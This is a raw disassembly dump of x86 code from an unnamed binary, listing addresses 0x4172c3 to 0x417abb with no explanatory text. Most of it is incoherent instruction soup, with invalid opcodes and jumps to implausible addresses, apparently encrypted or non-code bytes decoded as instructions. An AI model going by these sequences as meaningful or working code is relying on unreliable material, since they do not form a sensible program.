  4172c3:	(bad)  
  4172c5:	xchg   ecx,eax
  4172c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172c7:	dec    eax
  4172c8:	pop    ebp
  4172c9:	ror    DWORD PTR [esi],0x91
  4172cc:	gs dec ecx
  4172ce:	das    
  4172cf:	xchg   edx,eax
  4172d0:	mov    WORD PTR [esi+0x58],?
  4172d3:	or     ebp,esp
  4172d5:	mov    al,0xfa
  4172d7:	pop    ebp
  4172d8:	int3   
  4172d9:	add    eax,0x9d289757
  4172de:	sbb    DWORD PTR [edi],0x8666ef43
  4172e4:	dec    esi
  4172e5:	xor    dl,BYTE PTR [edx+eiz*2+0x40]
  4172e9:	mov    cl,0x1e
  4172eb:	lds    edi,FWORD PTR [ebx]
  4172ed:	fwait
  4172ee:	push   edx
  4172ef:	fs cmp eax,0x3927be16
  4172f5:	mov    ch,0xf
  4172f7:	or     DWORD PTR [ecx+0x57c1ab88],ebx
  4172fd:	popa   
  4172fe:	add    bh,ch
  417300:	inc    edx
  417301:	jae    0x4172bc
  417303:	xchg   BYTE PTR [esi-0x6dc3156f],dh
  417309:	hlt    
  41730a:	xor    DWORD PTR [ebx],edi
  41730c:	ds icebp 
  41730e:	out    dx,al
  41730f:	adc    bh,BYTE PTR [edi]
  417311:	adc    bl,ah
  417313:	and    bh,BYTE PTR [esi-0x36]
  417316:	lds    edi,FWORD PTR [edx+0x772be4c0]
  41731c:	adc    eax,0xcff67ba
  417321:	sub    BYTE PTR [ebp+0x55],ah
  417324:	xchg   ebp,eax
  417325:	or     eax,0x602551a0
  41732a:	xor    al,0x90
  41732c:	in     al,0x32
  41732e:	imul   esp,DWORD PTR [esi+0x22d4371b],0xb4a9103e
  417338:	cld    
  417339:	xchg   esp,eax
  41733a:	push   edi
  41733b:	pop    edx
  41733c:	pusha  
  41733d:	mov    BYTE PTR [edi-0x2f3a975],bl
  417343:	das    
  417344:	test   eax,0x4b63481
  417349:	cli    
  41734a:	enter  0x885d,0x12
  41734e:	sub    BYTE PTR [eax],al
  417350:	leave  
  417351:	gs pop edi
  417353:	add    bl,BYTE PTR [ecx+0x7125aefe]
  417359:	pop    ebx
  41735a:	inc    eax
  41735b:	jnp    0x417311
  41735d:	loop   0x417360
  41735f:	outs   dx,DWORD PTR ds:[esi]
  417360:	stos   DWORD PTR es:[edi],eax
  417361:	bnd jmp 0x630c019c
  417367:	xchg   ecx,eax
  417368:	test   al,0xb4
  41736a:	shl    DWORD PTR [eax],1
  41736c:	popa   
  41736d:	mov    edx,0xf621961
  417372:	inc    ecx
  417373:	jno    0x41730a
  417375:	push   edi
  417376:	cmp    al,0xf2
  417378:	(bad)  
  41737a:	xchg   ebp,eax
  41737b:	jnp    0x4173d4
  41737d:	xchg   ebx,eax
  41737e:	imul   edx,edi,0xea9ae680
  417384:	adc    ebx,DWORD PTR [ecx]
  417386:	fbld   TBYTE PTR [ebx+0x6f008072]
  41738c:	in     al,dx
  41738d:	int3   
  41738e:	adc    BYTE PTR [edi+0x6e],dl
  417391:	sub    BYTE PTR [edx],bl
  417393:	fnstsw WORD PTR [ebx]
  417395:	ins    BYTE PTR es:[edi],dx
  417396:	das    
  417397:	dec    BYTE PTR [ebx-0x48ced0ee]
  41739d:	pop    esi
  41739e:	pop    edi
  41739f:	sub    cl,dl
  4173a1:	lea    ebx,[ecx+ecx*2-0x617ee13b]
  4173a8:	xchg   BYTE PTR fs:[esi-0x6],cl
  4173ac:	gs cbw 
  4173af:	dec    ebx
  4173b0:	cli    
  4173b1:	or     al,0xfe
  4173b3:	jns    0x417409
  4173b5:	jp     0x41736a
  4173b7:	ja     0x417360
  4173b9:	dec    ebx
  4173ba:	das    
  4173bb:	dec    ecx
  4173bc:	xor    ebp,DWORD PTR [ecx+0x66017e5e]
  4173c2:	call   0x95f066dd
  4173c7:	loop   0x4173e7
  4173c9:	jle    0x417350
  4173cb:	mov    ecx,0xc4615fe1
  4173d0:	pop    edi
  4173d1:	je     0x417402
  4173d3:	scas   al,BYTE PTR es:[edi]
  4173d4:	(bad)  
  4173d6:	add    BYTE PTR [ebx+0x4b4b435a],bh
  4173dc:	popa   
  4173dd:	pusha  
  4173de:	adc    ebp,ebx
  4173e0:	add    al,0x7e
  4173e2:	stc    
  4173e3:	loope  0x4173ac
  4173e5:	(bad)  
  4173e7:	popf   
  4173e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173e9:	pop    ebp
  4173ea:	push   ss
  4173eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ec:	or     edx,0x64d27338
  4173f2:	in     al,0x1e
  4173f4:	lahf   
  4173f5:	xchg   edx,eax
  4173f6:	out    0xf6,al
  4173f8:	adc    eax,0x71262b7
  4173fd:	shl    BYTE PTR [edx+0x4fbd2768],1
  417403:	scas   eax,DWORD PTR es:[edi]
  417404:	retf   
  417405:	imul   eax,ecx,0xc18dbf5f
  41740b:	test   BYTE PTR [edi-0x2a],dl
  41740e:	sbb    esp,0x1f
  417411:	or     eax,0xf2566070
  417416:	jp     0x4173cb
  417418:	jnp    0x417406
  41741a:	outs   dx,DWORD PTR ds:[esi]
  41741b:	xchg   edi,eax
  41741c:	ds dec eax
  41741e:	push   0x1f1ba77d
  417423:	popf   
  417424:	in     eax,dx
  417425:	cdq    
  417426:	jmp    0xcf44:0xf7415fd7
  41742d:	or     ecx,DWORD PTR [eax-0x395fa1e5]
  417433:	add    DWORD PTR [ebx+0x674b550f],ebx
  417439:	pop    esp
  41743a:	cdq    
  41743b:	or     al,0xd2
  41743d:	ss stc 
  41743f:	inc    ebx
  417440:	ror    bl,1
  417442:	retf   0x46e7
  417445:	add    dh,BYTE PTR [ebp+0x4485ca39]
  41744b:	and    al,0x20
  41744d:	shl    BYTE PTR [edx+0x5000486f],cl
  417453:	mov    ebp,0xb58ac9cc
  417458:	push   ss
  417459:	add    dh,BYTE PTR [esi+0x52]
  41745c:	push   ecx
  41745d:	call   0x41e026
  417462:	mov    eax,DWORD PTR [esi]
  417464:	mov    ecx,DWORD PTR [esi+0x4]
  417467:	shrd   eax,ecx,0x2
  41746b:	shr    ecx,0x2
  41746e:	shr    edx,0x1e
  417471:	xor    ecx,0xe702a276
  417477:	jmp    0x417a01
  41747c:	repnz fadd DWORD PTR [eax-0xd9b9f7c]
  417483:	pop    eax
  417484:	loop   0x417458
  417486:	fsubr  DWORD PTR [eax+0x6e5c2969]
  41748c:	fimul  WORD PTR [edi+0x43d160c]
  417492:	push   ss
  417493:	push   ss
  417494:	mov    dl,BYTE PTR [ecx+0xb7d3611]
  41749a:	shl    DWORD PTR [ebx+eiz*4-0xa],0x82
  41749f:	inc    eax
  4174a0:	ds inc esp
  4174a2:	xor    al,0x8f
  4174a4:	(bad)  
  4174a5:	ins    DWORD PTR es:[edi],dx
  4174a6:	cmp    eax,edx
  4174a8:	sbb    eax,DWORD PTR [edi]
  4174aa:	lods   al,BYTE PTR ds:[esi]
  4174ab:	xor    bh,bh
  4174ad:	dec    esi
  4174ae:	fistp  WORD PTR [edi]
  4174b0:	push   ecx
  4174b1:	adc    eax,0x625f875f
  4174b6:	mov    bl,0x5e
  4174b8:	xor    eax,0x5fde74e4
  4174bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174be:	pop    ebp
  4174bf:	retf   
  4174c0:	sti    
  4174c1:	sub    al,0x85
  4174c3:	mov    al,0x18
  4174c5:	or     eax,0xf50ec88
  4174ca:	mov    eax,DWORD PTR [eax]
  4174cc:	jmp    0x8bb4:0x9ff9fbd
  4174d3:	das    
  4174d4:	jbe    0x4174eb
  4174d6:	scas   eax,DWORD PTR es:[edi]
  4174d7:	push   0xab20ae89
  4174dc:	dec    edi
  4174dd:	loopne 0x4174bd
  4174df:	dec    esp
  4174e0:	push   ecx
  4174e1:	xor    DWORD PTR [ecx-0x2b583a8],ebx
  4174e7:	data16 fst DWORD PTR [eax]
  4174ea:	mov    cl,0xf9
  4174ec:	imul   edi,eax,0x5aead3da
  4174f2:	bswap  esi
  4174f4:	sub    BYTE PTR [ecx],0xf7
  4174f7:	dec    esp
  4174f8:	jae    0x4174f2
  4174fa:	cmp    BYTE PTR [esi+0x342d550],dl
  417500:	add    DWORD PTR [esi-0x5a0209c9],ebp
  417506:	mov    ds:0xa101d23a,eax
  41750b:	xor    al,bl
  41750d:	pop    esp
  41750e:	inc    edi
  41750f:	add    DWORD PTR [eax-0x6f8f224c],esp
  417515:	and    BYTE PTR [edx],dl
  417517:	xlat   BYTE PTR ds:[ebx]
  417518:	rcl    DWORD PTR [ebp-0x29],0xce
  41751c:	aam    0xb5
  41751e:	stc    
  41751f:	and    BYTE PTR [esi-0xa560973],0x95
  417526:	mov    ch,0xeb
  417528:	adc    al,0x49
  41752a:	inc    ecx
  41752b:	xrelease mov BYTE PTR [ebx+ecx*4+0x6c],bl
  417530:	(bad)
  417533:	fidiv  DWORD PTR [edi+0x13]
  417536:	loop   0x41759e
  417538:	add    DWORD PTR [edx],edi
  41753a:	std    
  41753b:	je     0x417575
  41753d:	mov    ebx,DWORD PTR [eax-0x16bbb614]
  417543:	xlat   BYTE PTR ds:[ebx]
  417544:	js     0x417584
  417546:	repnz and al,0x7b
  417549:	xor    DWORD PTR [ebx+eax*2],edi
  41754c:	jmp    0x226aa434
  417551:	mov    esi,0x18882a83
  417556:	and    al,0x40
  417558:	sbb    al,0xa
  41755a:	rsqrtps xmm7,xmm6
  41755d:	add    esp,DWORD PTR [edi+0xc]
  417560:	retf   
  417561:	inc    ebp
  417562:	loop   0x41758c
  417564:	jns    0x4175e0
  417566:	cmp    BYTE PTR [ecx-0x4b],al
  417569:	es repz inc edi
  41756c:	ret    
  41756d:	imul   edx,DWORD PTR [ecx-0x30ed3e72],0x7bffe7e7
  417577:	push   ds
  417578:	jp     0x417549
  41757a:	in     eax,0x9f
  41757c:	mov    al,ds:0xfd04b6eb
  417581:	outs   dx,DWORD PTR ds:[esi]
  417582:	lods   al,BYTE PTR ds:[esi]
  417583:	inc    eax
  417584:	(bad)  
  417585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417586:	jmp    0x58de:0x124b526
  41758d:	icebp  
  41758e:	push   ebp
  41758f:	test   BYTE PTR [eax],0xff
  417592:	cld    
  417593:	and    esp,ebp
  417595:	add    dl,dh
  417597:	inc    eax
  417598:	sub    eax,0x90b50487
  41759d:	and    BYTE PTR [ecx-0x68760ef5],bh
  4175a3:	jp     0x4175c3
  4175a5:	add    DWORD PTR [edi],edx
  4175a7:	std    
  4175a8:	popa   
  4175a9:	sub    eax,0x57efac41
  4175ae:	cmp    al,0x60
  4175b0:	jne    0x41759a
  4175b2:	dec    ebx
  4175b3:	clc    
  4175b4:	mov    bl,0x74
  4175b6:	mov    cl,0x27
  4175b8:	xor    ebp,DWORD PTR [ebx+0x25]
  4175bb:	add    ebx,DWORD PTR [edx-0x52]
  4175be:	add    al,BYTE PTR [ebx]
  4175c0:	ins    DWORD PTR es:[edi],dx
  4175c1:	out    0xf4,eax
  4175c3:	xchg   edi,eax
  4175c4:	sub    al,0x72
  4175c6:	cmp    bl,BYTE PTR [edi]
  4175c8:	test   BYTE PTR [ebx+0x48],cl
  4175cb:	mov    ebx,0x12898841
  4175d0:	and    al,0x9f
  4175d2:	test   eax,0xa753f637
  4175d7:	test   BYTE PTR ds:0x4bd76d4d,bl
  4175dd:	in     eax,0x6e
  4175df:	(bad)  
  4175e0:	mov    dh,0x31
  4175e2:	push   cs
  4175e3:	cwde   
  4175e4:	mov    dh,0xf9
  4175e6:	xor    cl,BYTE PTR [esp+ecx*1+0x32a9e3a4]
  4175ed:	sub    al,0xf7
  4175ef:	mov    esi,0x818e5937
  4175f4:	mov    ecx,0xd871ab2
  4175f9:	ret    
  4175fa:	loopne 0x4175e1
  4175fc:	cmp    BYTE PTR [eax+0x6c],ah
  4175ff:	jp     0x4175bd
  417601:	(bad)  
  417602:	and    BYTE PTR [ebx-0x5a],dh
  417605:	lea    edx,[edx-0x3f]
  417608:	in     eax,dx
  417609:	jmp    0xeb2b280c
  41760e:	bound  edx,QWORD PTR [ecx]
  417610:	add    bh,al
  417612:	pusha  
  417613:	or     DWORD PTR [edi+0x29],eax
  417616:	xchg   esp,eax
  417617:	mov    bh,0x8c
  417619:	(bad)  
  41761a:	imul   esi,DWORD PTR [edi+esi*1-0x13],0x14
  41761f:	and    BYTE PTR [edx-0x70],bl
  417622:	(bad)  
  417623:	push   0x109d0075
  417628:	mov    edi,0x36d661e7
  41762d:	or     al,ch
  41762f:	pop    edi
  417630:	push   ds
  417631:	leave  
  417632:	ins    BYTE PTR es:[edi],dx
  417633:	repz pop ecx
  417635:	jecxz  0x4175cb
  417637:	rcr    DWORD PTR ds:0xc1a41394,0xbe
  41763e:	sbb    esp,eax
  417640:	sbb    eax,edx
  417642:	mov    ds:0x687c3c5b,eax
  417647:	aaa    
  417648:	xor    DWORD PTR [esi+0x42d4ba81],esp
  41764e:	ret    
  41764f:	inc    ebx
  417650:	shl    DWORD PTR [ebp-0x27ea2e16],0xa3
  417657:	scas   eax,DWORD PTR es:[edi]
  417658:	jecxz  0x41760a
  41765a:	(bad)  
  41765b:	inc    ecx
  41765c:	out    dx,eax
  41765d:	nop
  41765e:	cli    
  41765f:	dec    eax
  417660:	pop    ebx
  417661:	mov    cl,0x83
  417663:	xor    cl,0x51
  417666:	mov    ah,ah
  417668:	dec    edi
  417669:	retf   0xabc5
  41766c:	jl     0x417642
  41766e:	mov    ecx,0xc492abf3
  417673:	enter  0xe6cb,0xc4
  417677:	xlat   BYTE PTR ds:[ebx]
  417678:	scas   al,BYTE PTR es:[edi]
  417679:	lods   al,BYTE PTR ds:[esi]
  41767a:	sub    BYTE PTR [ebx+0x1b],bh
  41767d:	jle    0x4176ac
  41767f:	sbb    eax,0xbc969a23
  417684:	jne    0x417680
  417686:	jo     0x417624
  417688:	pop    edx
  417689:	daa    
  41768a:	mov    gs,WORD PTR [ecx+0x2da803f]
  417690:	push   ss
  417691:	xchg   BYTE PTR [ebp+eiz*8-0x53],dl
  417695:	sbb    esp,DWORD PTR [edi+ecx*4-0x6297c68e]
  41769c:	in     eax,dx
  41769d:	lds    esi,FWORD PTR [edx+0x63]
  4176a0:	xchg   ebp,eax
  4176a1:	mov    al,0x22
  4176a3:	jmp    0x1615f33a
  4176a8:	dec    ecx
  4176a9:	ja     0x41762d
  4176ab:	rol    dh,cl
  4176ad:	ins    DWORD PTR es:[edi],dx
  4176ae:	enter  0x600e,0xf0
  4176b2:	retf   
  4176b3:	aam    0x41
  4176b5:	xchg   DWORD PTR [edx+0x63],esi
  4176b8:	xor    BYTE PTR [eax],al
  4176ba:	mov    cl,0xc
  4176bc:	dec    edi
  4176bd:	xor    eax,0xf8e1cfee
  4176c2:	daa    
  4176c3:	xor    eax,DWORD PTR [edx]
  4176c5:	fsubr  QWORD PTR [ebx+0x19629ee9]
  4176cb:	shl    BYTE PTR [edi-0x64b3f5d7],cl
  4176d1:	fistp  QWORD PTR [edx]
  4176d3:	mov    ebp,0x1d183568
  4176d8:	mov    bh,0x1b
  4176da:	std    
  4176db:	jno    0x4176d7
  4176dd:	xchg   esp,eax
  4176de:	adc    esi,DWORD PTR [ecx]
  4176e0:	pop    eax
  4176e1:	inc    ebx
  4176e2:	fsub   QWORD PTR [ebx-0x574e1a91]
  4176e8:	fisttp QWORD PTR [edi+0x3b]
  4176eb:	add    ch,BYTE PTR [ecx-0x4b2fa947]
  4176f1:	dec    ebx
  4176f2:	sub    eax,0xad0d98fc
  4176f7:	daa    
  4176f8:	mul    ebp
  4176fa:	scas   al,BYTE PTR es:[edi]
  4176fb:	aaa    
  4176fc:	jno    0x417735
  4176fe:	fdivr  QWORD PTR [ebx]
  417700:	cmc    
  417701:	inc    esi
  417702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417703:	pop    ebp
  417704:	and    ebx,DWORD PTR [edx]
  417706:	add    eax,0x8c370e58
  41770b:	sbb    eax,0xd49f43d5
  417710:	jb     0x417782
  417712:	mov    edi,0x6f010990
  417717:	fcmovnb st,st(3)
  417719:	push   ss
  41771a:	js     0x41770e
  41771c:	fs sub al,0x33
  41771f:	add    eax,DWORD PTR [ebp+eiz*1+0x367dd23]
  417726:	(bad)  
  417727:	push   ebp
  417728:	mov    ds:0xa4f855bc,eax
  41772d:	mov    dl,BYTE PTR [ebx]
  41772f:	xchg   ebx,eax
  417730:	int3   
  417731:	mov    ebx,0xfb1f0be8
  417736:	(bad)  
  417737:	push   edx
  417738:	aad    0x35
  41773a:	jnp    0x41771e
  41773c:	add    edx,edi
  41773e:	push   esi
  41773f:	fadd   DWORD PTR [ecx]
  417741:	clc    
  417742:	jb     0x417759
  417744:	and    al,0x63
  417746:	push   ds
  417747:	mov    esp,DWORD PTR [edi+ebx*1+0x21c108ed]
  41774e:	(bad)  
  41774f:	jo     0x41778d
  417751:	aam    0x43
  417753:	sub    eax,0xb02e48e0
  417758:	nop
  417759:	mov    DWORD PTR [ebx-0x6b],edx
  41775c:	repnz sub al,BYTE PTR [ecx+0x35]
  417760:	or     BYTE PTR [edi-0x1c],0x36
  417764:	mov    ?,WORD PTR [esi+edi*4-0x3e]
  417768:	xchg   esp,eax
  417769:	and    eax,0xbe02a3fe
  41776e:	push   es
  41776f:	xchg   esp,eax
  417770:	and    ch,0x2c
  417773:	xchg   ebx,eax
  417774:	cmp    esi,DWORD PTR [ebx-0xfa6ab72]
  41777a:	pop    ebp
  41777b:	and    esi,ebp
  41777d:	js     0x417773
  41777f:	imul   di,WORD PTR [edx+0x6c],0xfadf
  417785:	aam    0x2f
  417787:	fisubr WORD PTR [eax-0x7e]
  41778a:	jmp    0x4177da
  41778c:	add    al,dl
  41778e:	jl     0x417770
  417790:	xchg   ebx,eax
  417791:	mov    al,0xf9
  417793:	gs inc ecx
  417795:	mov    ds:0x6751e038,al
  41779a:	pop    edi
  41779b:	and    eax,0xfd438571
  4177a0:	fwait
  4177a1:	int3   
  4177a2:	dec    edi
  4177a3:	lds    edx,FWORD PTR [eax+ecx*2-0x2f12941d]
  4177aa:	mov    ch,0x19
  4177ac:	or     eax,0x8cc306a9
  4177b1:	mov    dh,0x34
  4177b3:	pop    eax
  4177b4:	pushf  
  4177b5:	js     0x417777
  4177b7:	stc    
  4177b8:	sub    dh,dh
  4177ba:	adc    BYTE PTR [eax+ebx*8-0x598eb70],bh
  4177c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c2:	adc    al,0x4d
  4177c4:	push   ecx
  4177c5:	mov    ebx,0xb043443d
  4177ca:	jge    0x417831
  4177cc:	scas   al,BYTE PTR es:[edi]
  4177cd:	sbb    ch,BYTE PTR [eax]
  4177cf:	sbb    dl,al
  4177d1:	mov    edx,0xcb795b6c
  4177d6:	out    dx,eax
  4177d7:	sub    eax,0x585b1b67
  4177dc:	cmp    DWORD PTR [ecx-0x5fc6ba4a],esi
  4177e2:	push   0x9f2509
  4177e7:	test   DWORD PTR [edx+edi*8+0x5786273f],eax
  4177ee:	adc    esp,DWORD PTR [ecx]
  4177f0:	(bad)  
  4177f1:	(bad)  
  4177f2:	and    eax,0xc2ac4f8
  4177f7:	clc    
  4177f8:	and    BYTE PTR [edx],ah
  4177fa:	jmp    0x41777c
  4177fc:	cs adc al,0xab
  4177ff:	jmp    0xcc83:0x32558892
  417806:	fnstenv [eax+0x79]
  417809:	adc    eax,0x4ae3caff
  41780e:	iret   
  41780f:	dec    esi
  417810:	pop    es
  417811:	adc    bl,BYTE PTR [ecx]
  417813:	cmp    DWORD PTR [eax],ebp
  417815:	and    eax,0xe20cdbbd
  41781a:	adc    BYTE PTR [edi],dl
  41781c:	js     0x4177b8
  41781e:	add    eax,0x33b0c98b
  417823:	jb     0x4177ab
  417825:	out    dx,al
  417826:	lahf   
  417827:	add    al,BYTE PTR [ecx+esi*8-0x1b]
  41782b:	jo     0x4177c0
  41782d:	dec    ebp
  41782e:	mov    ds:0x828d02ac,eax
  417833:	mov    ds:0x2f5af194,al
  417838:	ret    
  417839:	sahf   
  41783a:	sub    ebp,DWORD PTR fs:[esi-0x4647d596]
  417841:	sub    BYTE PTR [eax+0x1a],dh
  417844:	lods   eax,DWORD PTR ds:[esi]
  417845:	mov    ecx,0x6cca25d6
  41784a:	dec    ebx
  41784b:	ins    BYTE PTR es:[edi],dx
  41784c:	mov    ch,0x27
  41784e:	test   eax,0x9ad64f07
  417853:	lods   al,BYTE PTR ds:[esi]
  417854:	pushf  
  417855:	add    edx,DWORD PTR [ebx+0x2d]
  417858:	or     DWORD PTR [ebp+0x413e19cb],esp
  41785e:	es mov edx,0xe64f7b26
  417864:	and    DWORD PTR [eax-0x48872ec9],esp
  41786a:	sar    BYTE PTR ds:0x2176bdc6,0x44
  417871:	push   esi
  417872:	(bad)  
  417874:	into   
  417875:	stc    
  417876:	mov    ebp,0xa9bb5160
  41787b:	aaa    
  41787c:	adc    dl,bh
  41787e:	iret   
  41787f:	popf   
  417880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417881:	sub    ebx,DWORD PTR [edi+ebp*8-0x40]
  417885:	mov    edx,0x4f101dad
  41788a:	xor    eax,0x5eff2d7b
  41788f:	xchg   BYTE PTR [ebp+0x5f],ah
  417892:	js     0x417898
  417894:	out    0xe5,eax
  417896:	cld    
  417897:	in     al,dx
  417898:	adc    BYTE PTR ds:0xe5ca008c,cl
  41789e:	jl     0x4178ba
  4178a0:	sbb    DWORD PTR [eax],0xffffffff
  4178a3:	das    
  4178a4:	scas   eax,DWORD PTR es:[edi]
  4178a5:	mov    ecx,0x3e61e3bc
  4178aa:	or     al,0xdb
  4178ac:	dec    esi
  4178ad:	cli    
  4178ae:	push   cs
  4178af:	icebp  
  4178b0:	aas    
  4178b1:	inc    ebx
  4178b2:	mov    esp,0xc5f29b83
  4178b7:	scas   eax,DWORD PTR es:[edi]
  4178b8:	jo     0x417882
  4178ba:	sub    ah,BYTE PTR [esi-0x71b10cfc]
  4178c0:	push   ds
  4178c1:	dec    ebx
  4178c2:	shl    DWORD PTR [eax-0x41],0xe7
  4178c6:	pop    esi
  4178c7:	pop    ss
  4178c8:	push   ds
  4178c9:	rcr    edx,1
  4178cb:	mov    dl,0xbf
  4178cd:	rol    BYTE PTR [edx-0x7af0f914],0xe0
  4178d4:	call   0xb772ec20
  4178d9:	js     0x41785f
  4178db:	xchg   esp,eax
  4178dc:	cli    
  4178dd:	(bad)  
  4178de:	ficom  DWORD PTR [ecx]
  4178e0:	jne    0x4178c2
  4178e2:	mov    dl,0xe5
  4178e4:	xchg   ebx,eax
  4178e5:	(bad)  
  4178e6:	jge    0x41786c
  4178e8:	xor    dh,BYTE PTR [ebx-0x61]
  4178eb:	loop   0x4178e0
  4178ed:	dec    DWORD PTR [ecx+0x6a186e4c]
  4178f3:	or     eax,0xf6591779
  4178f8:	add    ah,BYTE PTR [ebp+0x64]
  4178fb:	scas   al,BYTE PTR es:[edi]
  4178fc:	jnp    0x417960
  4178fe:	push   cs
  4178ff:	ja     0x417884
  417901:	loope  0x41791c
  417903:	xchg   edi,eax
  417904:	sub    ebp,esp
  417906:	loope  0x417943
  417908:	mov    eax,ds:0xea3e839b
  41790d:	int    0xd0
  41790f:	or     DWORD PTR [ecx-0x7],esp
  417912:	mov    ah,0x51
  417914:	aas    
  417915:	outs   dx,BYTE PTR ds:[esi]
  417916:	mov    dl,ch
  417918:	in     al,0x2
  41791a:	cmp    eax,0xf4bcb9b
  41791f:	dec    edx
  417920:	out    dx,al
  417921:	xchg   edx,eax
  417922:	sahf   
  417923:	(bad)  
  417924:	push   0x1
  417926:	xor    eax,0xf719cb99
  41792b:	dec    ecx
  41792c:	fs cwde 
  41792e:	popa   
  41792f:	sub    al,0x1c
  417931:	sub    ebx,edi
  417933:	sahf   
  417934:	inc    ecx
  417935:	push   esi
  417936:	dec    ecx
  417937:	pop    ecx
  417938:	pop    es
  417939:	outs   dx,BYTE PTR ds:[esi]
  41793a:	or     eax,0xa8e6d942
  41793f:	lds    ebp,FWORD PTR [eax-0x2f]
  417942:	adc    eax,0xf8f75898
  417947:	test   eax,0x35b2697e
  41794c:	imul   esp,ecx,0x56136efa
  417952:	jns    0x417933
  417954:	ins    BYTE PTR es:[edi],dx
  417955:	pop    esp
  417956:	push   0x37
  417958:	jo     0x4179a4
  41795a:	xchg   esp,eax
  41795b:	mov    ds:0xb82db69c,al
  417960:	mov    ds:0xa7097906,al
  417965:	jge    0x4178f7
  417967:	retf   0xe924
  41796a:	pusha  
  41796b:	in     eax,0xd8
  41796d:	les    edx,FWORD PTR [eax-0x1e]
  417970:	cmp    al,0x26
  417972:	std    
  417973:	dec    ebp
  417974:	dec    ebp
  417975:	test   eax,0xb8f64052
  41797a:	sbb    al,0x73
  41797c:	mov    esi,0xd7cc6d9f
  417981:	cmpps  xmm4,xmm5,0xaf
  417985:	pop    esp
  417986:	cmp    bh,cl
  417988:	test   BYTE PTR [ebx],cl
  41798a:	inc    eax
  41798b:	cld    
  41798c:	sub    esp,DWORD PTR [esi+0x595a19a8]
  417992:	sub    dl,BYTE PTR [eax]
  417994:	and    DWORD PTR [eax],ebx
  417996:	and    eax,0x1de54bc6
  41799b:	mov    ch,0xdb
  41799d:	outs   dx,DWORD PTR ds:[esi]
  41799e:	enter  0x6126,0xa1
  4179a2:	xor    BYTE PTR [edx+ecx*2+0x75f90b38],ch
  4179a9:	sbb    edi,DWORD PTR [ebp+0x72]
  4179ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ad:	loopne 0x417a1e
  4179af:	fldl2t 
  4179b1:	inc    ebp
  4179b2:	icebp  
  4179b3:	and    dl,BYTE PTR [esi+0x52]
  4179b6:	mov    dl,0x8a
  4179b8:	hlt    
  4179b9:	mov    dl,0xa1
  4179bb:	jmp    0x32f4:0xaf8a5514
  4179c2:	out    dx,al
  4179c3:	shl    esp,cl
  4179c5:	dec    ebx
  4179c6:	pxor   mm5,mm1
  4179c9:	js     0x1c159512
  4179cf:	mov    dl,0x2
  4179d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179d2:	jo     0x4179b3
  4179d4:	jle    0x4179be
  4179d6:	xchg   ecx,eax
  4179d7:	popa   
  4179d8:	cmp    al,0x60
  4179da:	scas   al,BYTE PTR es:[edi]
  4179db:	loopne 0x41796e
  4179dd:	int    0x6c
  4179df:	out    0x9b,al
  4179e1:	mov    ecx,0x42c9f2c5
  4179e6:	jge    0x4179ba
  4179e8:	fidivr DWORD PTR ds:0x4f8cd69d
  4179ee:	adc    BYTE PTR ds:0xa14ad0eb,al
  4179f4:	rcl    ebx,cl
  4179f6:	cmp    DWORD PTR [edi],ebx
  4179f8:	rcr    BYTE PTR [esi],1
  4179fa:	shl    DWORD PTR cs:[eax-0x1a30bf78],1
  417a01:	push   ecx
  417a02:	xor    eax,edi
  417a04:	mov    DWORD PTR [ebp+0x10],edx
  417a07:	mov    edx,DWORD PTR [ebx]
  417a09:	jmp    0x417f93
  417a0e:	in     al,dx
  417a0f:	and    cl,BYTE PTR [esi-0x3d]
  417a12:	dec    eax
  417a13:	mov    ds:0xcc442870,eax
  417a18:	xor    BYTE PTR [edx-0x4b047bd1],0x4
  417a1f:	jnp    0x417a2d
  417a21:	push   ss
  417a22:	cmp    eax,0x79161604
  417a27:	add    DWORD PTR [ebp+eiz*8+0x24],esi
  417a2b:	push   edx
  417a2c:	sbb    DWORD PTR [edi+0x26],edi
  417a2f:	sub    al,BYTE PTR [ecx-0x23]
  417a32:	ins    DWORD PTR es:[edi],dx
  417a33:	adc    eax,0xf96382cb
  417a38:	push   ecx
  417a39:	jb     0x417a2d
  417a3b:	outs   dx,BYTE PTR ds:[esi]
  417a3c:	fnstsw WORD PTR [edx+0x170da46c]
  417a42:	(bad)  [ecx+edx*2]
  417a45:	sti    
  417a46:	(bad)  [ecx+0x68]
  417a49:	adc    al,0x24
  417a4b:	loop   0x417aae
  417a4d:	push   ss
  417a4e:	xchg   esi,eax
  417a4f:	mov    BYTE PTR [edx-0x1e],ah
  417a52:	in     eax,dx
  417a53:	xor    BYTE PTR [edx],dl
  417a55:	into   
  417a56:	jle    0x417ac7
  417a58:	adc    eax,0x14d3f231
  417a5d:	sbb    eax,0x3f4e9151
  417a62:	fist   DWORD PTR [ecx-0x5589fd72]
  417a68:	sbb    edi,esp
  417a6a:	sahf   
  417a6b:	jle    0x4179ee
  417a6d:	jle    0x417a59
  417a6f:	mov    dl,0xea
  417a71:	rcl    DWORD PTR [edi],1
  417a73:	daa    
  417a74:	cwde   
  417a75:	outs   dx,DWORD PTR ds:[esi]
  417a76:	jg     0x417aa0
  417a78:	sbb    DWORD PTR ds:0x8d2fcd4b,0x9d745970
  417a82:	bound  edi,QWORD PTR [edi+0x5af8a799]
  417a88:	std    
  417a89:	popf   
  417a8a:	xor    bh,dl
  417a8c:	test   eax,0x53c76143
  417a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a92:	leave  
  417a93:	fdivr  QWORD PTR [eax]
  417a95:	loopne 0x417a7e
  417a97:	add    al,0x97
  417a99:	or     bl,ch
  417a9b:	test   BYTE PTR [ecx+0xa],cl
  417a9e:	in     eax,dx
  417a9f:	jo     0x417ad3
  417aa1:	call   0xca21fa73
  417aa6:	inc    esp
  417aa7:	jmp    0x40108693
  417aac:	test   DWORD PTR [edx-0x59],esi
  417aaf:	xchg   esi,eax
  417ab0:	inc    ebp
  417ab1:	inc    edx
  417ab2:	fild   QWORD PTR [eax+eax*4+0x7d]
  417ab6:	mov    ecx,0x621609a1
  417abb:	jne    0x417a86
